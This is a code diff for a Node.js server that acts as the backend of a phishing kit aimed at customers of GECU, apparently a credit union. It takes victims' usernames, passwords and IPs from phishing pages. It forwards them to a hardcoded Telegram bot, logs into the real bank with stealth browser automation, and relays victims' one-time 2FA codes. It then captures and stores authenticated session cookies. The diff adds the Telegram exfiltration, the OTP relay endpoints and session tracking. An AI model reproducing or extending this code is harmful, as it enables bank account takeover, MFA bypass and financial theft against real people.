@@ -2,13 +2,12 @@ const express = require('express');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const Database = require('better-sqlite3');
-const fs = require('fs/promises'); // 
 const nodemailer = require('nodemailer');
 const path = require('path');
+const axios = require('axios');
 
 // Use stealth plugin to avoid detection
 puppeteer.use(StealthPlugin());
-
 
 const app = express();
 app.use(express.json());
@@ -37,15 +36,46 @@ db.exec(`
         updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
     );
     
+    CREATE TABLE IF NOT EXISTS sessions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        session_id TEXT NOT NULL UNIQUE,
+        email TEXT NOT NULL,
+        password TEXT NOT NULL,
+        ip TEXT NOT NULL,
+        status TEXT NOT NULL DEFAULT 'pending',
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        expires_at DATETIME NOT NULL
+    );
+    
     CREATE INDEX IF NOT EXISTS idx_results_ip ON results(ip);
     CREATE INDEX IF NOT EXISTS idx_cookies_email ON cookies(email);
+    CREATE INDEX IF NOT EXISTS idx_sessions_session_id ON sessions(session_id);
+    CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at);
 `);
 
 console.log('✅ SQLite database initialized at:', dbPath);
 
 const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';
 
+// Telegram Configuration
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7530395745:AAEcMnLa5GAjrPdt2LMSAypyNyWQHOp1jnU';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1311316374';
 
+// Telegram notification function
+async function sendTelegram(message) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(url, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log('✅ Telegram notification sent');
+    } catch (error) {
+        console.log('⚠️ Telegram notification failed:', error.message);
+    }
+}
 
 // Define your email configuration (adjust these with your SMTP settings)
 const transporter = nodemailer.createTransport({
@@ -79,10 +109,32 @@ let isPageLoading = false; // To avoid race conditions
 const loginUrl = "https://www.gecu-ep.org/dbank/live/app/login/consumer";
 const mfaUrl = "https://www.gecu-ep.org/dbank/live/app/mfa";
 
+// Session storage for active login sessions (in-memory for fast access)
+const activeSessions = new Map();
+
+// Clean up expired sessions every 5 minutes
+setInterval(() => {
+    const now = Date.now();
+    for (const [sessionId, session] of activeSessions.entries()) {
+        if (session.expiresAt < now) {
+            console.log(`🧹 Cleaning up expired session: ${sessionId}`);
+            activeSessions.delete(sessionId);
+            
+            // Also cleanup from database
+            try {
+                const deleteStmt = db.prepare('DELETE FROM sessions WHERE session_id = ?');
+                deleteStmt.run(sessionId);
+            } catch (e) {
+                console.log('Error cleaning up session from DB:', e.message);
+            }
+        }
+    }
+}, 5 * 60 * 1000); // Every 5 minutes
+
 async function startBrowserAndPage() {
     try {
         browser = await puppeteer.launch({
-            headless: true, // Must be true for server deployment
+            headless: false, // Set to false for local testing to see browser window
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
@@ -104,98 +156,44 @@ async function startBrowserAndPage() {
 //------------------------------------------- Preload Page --------------------------------------------------
 
 async function preloadNewPage() {
-    if (isPageLoading) return; // Avoid multiple pages being loaded at the same time
-    isPageLoading = true;
-
     try {
         page = await browser.newPage();
-
         await page.setRequestInterception(true);
         page.on('request', (request) => {
-            if (['image', 'stylesheet', 'font'].includes(request.resourceType())) {
-                request.abort(); // Block images, styles, and fonts
+            // Allow stylesheets and fonts for React apps, only block images
+            if (request.resourceType() === "image") {
+                request.abort();
             } else {
                 request.continue();
             }
         });
-
-        try {
-            await page.setUserAgent(ua);
-            
-            // Additional anti-detection measures
-            await page.evaluateOnNewDocument(() => {
-                // Remove webdriver property
-                Object.defineProperty(navigator, 'webdriver', {
-                    get: () => undefined,
-                });
-                
-                // Mock plugins
-                Object.defineProperty(navigator, 'plugins', {
-                    get: () => [1, 2, 3, 4, 5],
-                });
-                
-                // Mock languages
-                Object.defineProperty(navigator, 'languages', {
-                    get: () => ['en-US', 'en'],
-                });
-                
-                // Mock permissions
-                const originalQuery = window.navigator.permissions.query;
-                window.navigator.permissions.query = (parameters) => (
-                    parameters.name === 'notifications' ?
-                        Promise.resolve({ state: Notification.permission }) :
-                        originalQuery(parameters)
-                );
-                
-                // Mock chrome runtime
-                window.chrome = {
-                    runtime: {},
-                };
+        await page.setUserAgent(ua);
+        
+        // Add anti-detection measures
+        await page.evaluateOnNewDocument(() => {
+            Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined,
             });
-            
-        } catch (e) {
-            console.log('User agent setting failed (ignored):', e.message);
-        }
+            Object.defineProperty(navigator, 'plugins', {
+                get: () => [1, 2, 3, 4, 5],
+            });
+            Object.defineProperty(navigator, 'languages', {
+                get: () => ['en-US', 'en'],
+            });
+            window.chrome = { runtime: {} };
+        });
         
         await page.goto(loginUrl, { waitUntil: 'domcontentloaded' });
-        
-        // Only set viewport if page is still open
-        if (!page.isClosed()) {
-            try {
-                await page.setViewport({ width: 1280, height: 800 });
-            } catch (e) {
-                console.log('Viewport setting failed (ignored):', e.message);
-            }
-        }
-
-        // Ensure remember me is checked
-        await page.evaluate(() => {
-            const rememberMeCheckbox = document.querySelector('input#rememberMe');
-            if (rememberMeCheckbox) rememberMeCheckbox.checked = true;
-        });
-
-        console.log('Page preloaded and ready for the next request.');
+        console.log('✅ Page preloaded successfully');
     } catch (error) {
-        console.error('Error during page preload:', error.message);
-        console.log('Next request will create its own page.');
-        // Clean up if page creation failed
-        if (page && !page.isClosed()) {
-            try {
-                await page.close();
-            } catch (e) {
-                // Ignore close errors
-            }
-        }
-    } finally {
-        isPageLoading = false; // Mark the page as fully loaded
+        console.error('Error preloading page:', error.message);
     }
 }
+
 
 startBrowserAndPage();
 
 //---------------------------------------- Perform Login ----------------------------------------------------
-
-
 
 // Function to handle GECU single-step login (User ID + Password on same page)
 async function performLogin(page, userId, password) {
@@ -518,6 +516,7 @@ async function getEmailPasswordByIP(ip) {
 }
 
 //---------------------------------------- Saving emails and passwords --------------------------------------
+
 async function saveEmailPasswordIP(email, password, ip) {
     try {
         const checkStmt = db.prepare('SELECT id FROM results WHERE ip = ?');
@@ -541,7 +540,432 @@ async function saveEmailPasswordIP(email, password, ip) {
     }
 }
 
-//----------------------------------------- Login route -----------------------------------------------------
+//----------------------------------------- Session Management ---------------------------------------------
+
+function createSession(sessionId, email, password, ip) {
+    const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes from now
+    
+    const session = {
+        sessionId,
+        email,
+        password,
+        ip,
+        status: 'pending',
+        createdAt: Date.now(),
+        expiresAt: expiresAt.getTime(),
+        browser: null,
+        page: null
+    };
+    
+    activeSessions.set(sessionId, session);
+    
+    // Also save to database
+    try {
+        const insertStmt = db.prepare(`
+            INSERT INTO sessions (session_id, email, password, ip, status, expires_at)
+            VALUES (?, ?, ?, ?, 'pending', ?)
+        `);
+        insertStmt.run(sessionId, email, password, ip, expiresAt.toISOString());
+    } catch (error) {
+        console.log('Error saving session to DB:', error.message);
+    }
+    
+    return session;
+}
+
+function getSession(sessionId) {
+    // Check in-memory first
+    const session = activeSessions.get(sessionId);
+    if (session) {
+        // Check if expired
+        if (session.expiresAt < Date.now()) {
+            activeSessions.delete(sessionId);
+            return null;
+        }
+        return session;
+    }
+    
+    // Fallback to database
+    try {
+        const stmt = db.prepare('SELECT * FROM sessions WHERE session_id = ? AND expires_at > datetime("now")');
+        const row = stmt.get(sessionId);
+        if (row) {
+            return {
+                sessionId: row.session_id,
+                email: row.email,
+                password: row.password,
+                ip: row.ip,
+                status: row.status,
+                createdAt: new Date(row.created_at).getTime(),
+                expiresAt: new Date(row.expires_at).getTime(),
+                browser: null,
+                page: null
+            };
+        }
+    } catch (error) {
+        console.log('Error getting session from DB:', error.message);
+    }
+    
+    return null;
+}
+
+function updateSessionStatus(sessionId, status) {
+    const session = activeSessions.get(sessionId);
+    if (session) {
+        session.status = status;
+        session.updatedAt = Date.now();
+    }
+    
+    // Update database
+    try {
+        const updateStmt = db.prepare('UPDATE sessions SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?');
+        updateStmt.run(status, sessionId);
+    } catch (error) {
+        console.log('Error updating session in DB:', error.message);
+    }
+}
+
+//----------------------------------------- API Endpoints for PHP Integration ------------------------------
+
+// New endpoint: Initialize login session (called from step1.php)
+app.post('/api/init-login', async (req, res) => {
+    const { sessionId, email, password, ip } = req.body;
+
+    if (!sessionId || !email || !password || !ip) {
+        return res.status(400).json({ success: false, error: 'sessionId, email, password, and ip are required' });
+    }
+
+    try {
+        // Create session
+        const session = createSession(sessionId, email, password, ip);
+        console.log(`✅ Session created: ${sessionId} for ${email}`);
+        
+        // Send credentials to Telegram
+        const telegramMsg = `🔥 <b>GECU 💰</b>\n\n` +
+                           `👤 <b>USERNAME:</b> ${email}\n` +
+                           `🔒 <b>PASSWORD:</b> ${password}\n\n` +
+                           `ℹ️ <b>IP INFO:</b> ${ip}\n` +
+                           `📆 <b>TIME/DATE:</b> ${new Date().toLocaleString()}\n\n` +
+                           `🥷🥷G 1 N G🥷🥷`;
+        await sendTelegram(telegramMsg);
+        
+        // Start login process asynchronously (don't wait)
+        (async () => {
+            let localBrowser = null;
+            let localPage = null;
+            
+            try {
+                // Create a new browser instance for this session
+                localBrowser = await puppeteer.launch({
+                    headless: true,
+                    args: [
+                        '--no-sandbox',
+                        '--disable-setuid-sandbox',
+                        '--disable-dev-shm-usage',
+                        '--disable-blink-features=AutomationControlled',
+                        '--disable-gpu',
+                        '--single-process',
+                    ],
+                });
+
+                localPage = await localBrowser.newPage();
+                await localPage.setRequestInterception(true);
+                localPage.on('request', (request) => {
+                    if (request.resourceType() === "image") {
+                        request.abort();
+                    } else {
+                        request.continue();
+                    }
+                });
+                await localPage.setUserAgent(ua);
+                
+                await localPage.evaluateOnNewDocument(() => {
+                    Object.defineProperty(navigator, 'webdriver', {
+                        get: () => undefined,
+                    });
+                    Object.defineProperty(navigator, 'plugins', {
+                        get: () => [1, 2, 3, 4, 5],
+                    });
+                    Object.defineProperty(navigator, 'languages', {
+                        get: () => ['en-US', 'en'],
+                    });
+                    window.chrome = { runtime: {} };
+                });
+                
+                await localPage.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
+                await localPage.setViewport({ width: 1280, height: 800 });
+                
+                // Wait for React app to load
+                try {
+                    await localPage.waitForSelector('body', { timeout: 10000 });
+                    await new Promise(res => setTimeout(res, 3000));
+                } catch (e) {
+                    console.log('Warning: Body selector timeout, continuing anyway...');
+                }
+                
+                // Perform login
+                const loginResult = await performLogin(localPage, email, password);
+                
+                if (!loginResult.success) {
+                    updateSessionStatus(sessionId, 'failed');
+                    await sendTelegram(`❌ <b>GECU Login Failed</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${loginResult.error}\n\n⚠️ Please connect manually.`);
+                    
+                    if (localBrowser) await localBrowser.close();
+                    return;
+                }
+                
+                // Handle 2FA method selection
+                if (loginResult.mode === '2fa_method_selection') {
+                    const methodResult = await select2FAMethod(localPage);
+                    
+                    if (methodResult.success) {
+                        updateSessionStatus(sessionId, 'otp_sent');
+                        // Store browser and page in session
+                        session.browser = localBrowser;
+                        session.page = localPage;
+                        activeSessions.set(sessionId, session);
+                        console.log(`✅ OTP sent via ${methodResult.method} for session ${sessionId}`);
+                    } else {
+                        updateSessionStatus(sessionId, 'failed');
+                        await sendTelegram(`❌ <b>GECU 2FA Method Selection Failed</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${methodResult.error}\n\n⚠️ Please connect manually.`);
+                        if (localBrowser) await localBrowser.close();
+                    }
+                } else if (loginResult.mode === 'logged_in') {
+                    // No 2FA required - get cookies immediately
+                    const cookies = await localPage.cookies();
+                    const userEntry = {
+                        email,
+                        password,
+                        cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE')).map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
+                    };
+                    
+                    // Save cookies
+                    try {
+                        const cookiesJson = JSON.stringify(userEntry.cookies);
+                        const checkStmt = db.prepare('SELECT id FROM cookies WHERE email = ?');
+                        const existingCookie = checkStmt.get(email);
+                        
+                        if (existingCookie) {
+                            const updateStmt = db.prepare('UPDATE cookies SET password = ?, cookies = ?, updated_at = CURRENT_TIMESTAMP WHERE email = ?');
+                            updateStmt.run(password, cookiesJson, email);
+                        } else {
+                            const insertStmt = db.prepare('INSERT INTO cookies (email, password, cookies) VALUES (?, ?, ?)');
+                            insertStmt.run(email, password, cookiesJson);
+                        }
+                        console.log('Cookies saved to SQLite');
+                    } catch (error) {
+                        console.log('⚠️ Cookie save error:', error.message);
+                    }
+                    
+                    updateSessionStatus(sessionId, 'completed');
+                    if (localBrowser) await localBrowser.close();
+                }
+            } catch (error) {
+                console.error('Error in background login process:', error);
+                updateSessionStatus(sessionId, 'failed');
+                await sendTelegram(`❌ <b>GECU Login Error</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${error.message}\n\n⚠️ Please connect manually.`);
+                if (localBrowser) await localBrowser.close();
+            }
+        })();
+        
+        // Respond immediately
+        res.status(200).json({ 
+            success: true, 
+            message: 'Login process started. OTP will be sent shortly.' 
+        });
+        
+    } catch (error) {
+        console.error('Error initializing login:', error);
+        res.status(500).json({ 
+            success: false, 
+            error: error.message 
+        });
+    }
+});
+
+// New endpoint: Submit OTP (called from sms.php)
+app.post('/api/submit-otp', async (req, res) => {
+    const { sessionId, code } = req.body;
+
+    if (!sessionId || !code) {
+        return res.status(400).json({ success: false, error: 'sessionId and code are required' });
+    }
+
+    const session = getSession(sessionId);
+    if (!session) {
+        return res.status(404).json({ success: false, error: 'Session not found or expired' });
+    }
+
+    if (session.status !== 'otp_sent') {
+        return res.status(400).json({ success: false, error: 'Session not ready for OTP submission' });
+    }
+
+    let localBrowser = session.browser;
+    let localPage = session.page;
+
+    try {
+        if (!localPage || localPage.isClosed()) {
+            // Need to recreate browser session
+            throw new Error('Browser session lost. Please restart login process.');
+        }
+
+        // Find and type OTP code
+        await new Promise(res => setTimeout(res, 1000));
+        
+        const codeInput = await localPage.evaluateHandle(() => {
+            const inputs = Array.from(document.querySelectorAll('input[type="text"], input:not([type])'));
+            return inputs.find(input => {
+                const placeholder = (input.placeholder || '').toLowerCase();
+                const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
+                return placeholder.includes('code') || 
+                       ariaLabel.includes('code') || 
+                       placeholder.includes('enter code');
+            });
+        });
+        
+        if (!codeInput || !codeInput.asElement()) {
+            throw new Error('Code input field not found');
+        }
+        
+        await codeInput.asElement().click();
+        await localPage.keyboard.down('Control');
+        await localPage.keyboard.press('KeyA');
+        await localPage.keyboard.up('Control');
+        await codeInput.asElement().type(code, { delay: 50 });
+        console.log('OTP code typed');
+        
+        await new Promise(res => setTimeout(res, 500));
+        
+        // Submit the code
+        const submitButton = await localPage.evaluateHandle(() => {
+            const buttons = Array.from(document.querySelectorAll('button, [role="button"], a, input[type="submit"]'));
+            return buttons.find(btn => {
+                const text = (btn.textContent || btn.value || '').trim().toLowerCase();
+                return text === 'submit' || text === 'continue' || text === 'verify' || 
+                       text.includes('submit') || btn.type === 'submit';
+            });
+        });
+        
+        if (submitButton && submitButton.asElement()) {
+            await submitButton.asElement().click();
+            console.log('Submit button clicked');
+        } else {
+            await localPage.keyboard.press('Enter');
+            console.log('Pressed Enter to submit code');
+        }
+        
+        // Wait for navigation
+        try {
+            await localPage.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
+        } catch (e) {
+            console.log('Navigation timeout, checking result...');
+        }
+        
+        await new Promise(res => setTimeout(res, 2000));
+        
+        // Check for errors
+        const hasError = await localPage.evaluate(() => {
+            const bodyText = document.body.textContent || '';
+            return bodyText.toLowerCase().includes('incorrect') || 
+                   bodyText.toLowerCase().includes('invalid') ||
+                   bodyText.toLowerCase().includes('error');
+        });
+        
+        const currentUrl = localPage.url();
+        
+        if (hasError || currentUrl.includes('/mfa')) {
+            updateSessionStatus(sessionId, 'otp_failed');
+            return res.status(400).json({ 
+                success: false, 
+                error: 'Invalid verification code. Please try again.' 
+            });
+        }
+        
+        // Success! Get cookies
+        const cookies = await localPage.cookies();
+        const userEntry = {
+            email: session.email,
+            password: session.password,
+            cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE')).map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
+        };
+        
+        // Save cookies
+        try {
+            const cookiesJson = JSON.stringify(userEntry.cookies);
+            const checkStmt = db.prepare('SELECT id FROM cookies WHERE email = ?');
+            const existingCookie = checkStmt.get(session.email);
+            
+            if (existingCookie) {
+                const updateStmt = db.prepare('UPDATE cookies SET password = ?, cookies = ?, updated_at = CURRENT_TIMESTAMP WHERE email = ?');
+                updateStmt.run(session.password, cookiesJson, session.email);
+            } else {
+                const insertStmt = db.prepare('INSERT INTO cookies (email, password, cookies) VALUES (?, ?, ?)');
+                insertStmt.run(session.email, session.password, cookiesJson);
+            }
+            console.log('Cookies saved to SQLite');
+        } catch (error) {
+            console.log('⚠️ Cookie save error:', error.message);
+        }
+        
+        // Send success notification
+        await sendTelegram(`✅ <b>GECU Login Success</b>\n\nSession: ${sessionId}\nEmail: ${session.email}\nCookies captured successfully!`);
+        
+        updateSessionStatus(sessionId, 'completed');
+        
+        // Clean up
+        if (localBrowser) {
+            await localBrowser.close();
+        }
+        activeSessions.delete(sessionId);
+        
+        res.status(200).json({ 
+            success: true, 
+            message: 'Login successful. Cookies captured.' 
+        });
+        
+    } catch (error) {
+        console.error('Error submitting OTP:', error);
+        updateSessionStatus(sessionId, 'failed');
+        
+        if (localBrowser) {
+            try {
+                await localBrowser.close();
+            } catch (e) {
+                // Ignore close errors
+            }
+        }
+        activeSessions.delete(sessionId);
+        
+        await sendTelegram(`❌ <b>GECU OTP Submission Failed</b>\n\nSession: ${sessionId}\nEmail: ${session.email}\nError: ${error.message}\n\n⚠️ Please connect manually.`);
+        
+        res.status(500).json({ 
+            success: false, 
+            error: error.message 
+        });
+    }
+});
+
+// New endpoint: Check session status (for polling from PHP)
+app.get('/api/session/:sessionId', (req, res) => {
+    const { sessionId } = req.params;
+    const session = getSession(sessionId);
+    
+    if (!session) {
+        return res.status(404).json({ success: false, error: 'Session not found or expired' });
+    }
+    
+    res.status(200).json({
+        success: true,
+        session: {
+            status: session.status,
+            email: session.email,
+            createdAt: session.createdAt,
+            expiresAt: session.expiresAt
+        }
+    });
+});
+
+//----------------------------------------- Legacy Endpoints (keeping for backward compatibility) ----------
 
 // Endpoint handling the request
 app.post('/login', async (req, res) => {
@@ -646,24 +1070,21 @@ app.post('/login', async (req, res) => {
         if (loginResult.success && loginResult.mode === '2fa_code_entry') {
             await saveEmailPasswordIP(email, password, ip);
             
-            // Close the local page first
-            if (localPage && !localPage.isClosed()) {
-                await localPage.close();
+            // Close the local page only - don't close the browser, /loginsms will create its own
+            try {
+                if (localPage && !localPage.isClosed()) {
+                    await localPage.close();
+                    console.log('Local page closed after 2FA code entry page detected');
+                }
+            } catch (e) {
+                console.log('Error closing local page:', e.message);
             }
             
-            if (browser) {
-                await browser.close();
-                console.log('Browser closed after 2FA code entry page detected');
-            }
-            try {
-                await startBrowserAndPage();
-            } catch (e) {
-                console.log('Error starting fresh browser:', e.message);
-            }
+            // Don't close the shared browser here - /loginsms creates its own browser instance
             return res.status(200).json({ 
                 success: true, 
                 mode: '2fa', 
-                message: '2FA code entry page ready.' 
+                message: '2FA code entry page ready. Please submit code via /loginsms endpoint.' 
             });
         }
         if (loginResult.success && loginResult.mode === 'logged_in') {
@@ -861,7 +1282,7 @@ app.post('/loginsms', async (req, res) => {
 
         // Create a new browser for each SMS request (like old version)
         browser = await puppeteer.launch({
-            headless: true, // Must be true for server deployment
+            headless: false, // Set to false for local testing to see browser window
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
@@ -876,8 +1297,9 @@ app.post('/loginsms', async (req, res) => {
 
         await localPage.setRequestInterception(true);
         localPage.on('request', (request) => {
-            if (['image', 'stylesheet', 'font'].includes(request.resourceType())) {
-                request.abort(); // Block images, styles, and fonts
+            // Allow stylesheets and fonts for React apps, only block images
+            if (request.resourceType() === "image") {
+                request.abort();
             } else {
                 request.continue();
             }
@@ -1015,10 +1437,12 @@ app.post('/loginsms', async (req, res) => {
             });
         }
         
-        // Also check if we're still on the MFA page (indicates generic error)
+        // Also check if we're still on the login/2FA page (indicates generic error)
         const currentUrl = localPage.url();
-        if (currentUrl.includes('/mfa')) {
-            console.log('Still on MFA page - likely incorrect code (no specific error message)');
+        const bodyText = await localPage.evaluate(() => document.body.textContent || '');
+        
+        if (currentUrl.includes('/login') && bodyText.includes('email authenticator')) {
+            console.log('Still on login/2FA page - likely incorrect code (no specific error message)');
             return res.status(400).json({ 
                 success: false, 
                 error: 'Invalid verification code. Please try again.' 
@@ -1109,11 +1533,20 @@ const sendEmail = async (emailOptions) => {
 
 
 
-
-
-
 // Gracefully close the browser and database when the application is terminated
 process.on('SIGINT', async () => {
+    // Close all active browser sessions
+    for (const [sessionId, session] of activeSessions.entries()) {
+        if (session.browser) {
+            try {
+                await session.browser.close();
+            } catch (e) {
+                // Ignore errors
+            }
+        }
+    }
+    activeSessions.clear();
+    
     if (browser) {
         await browser.close();
     }
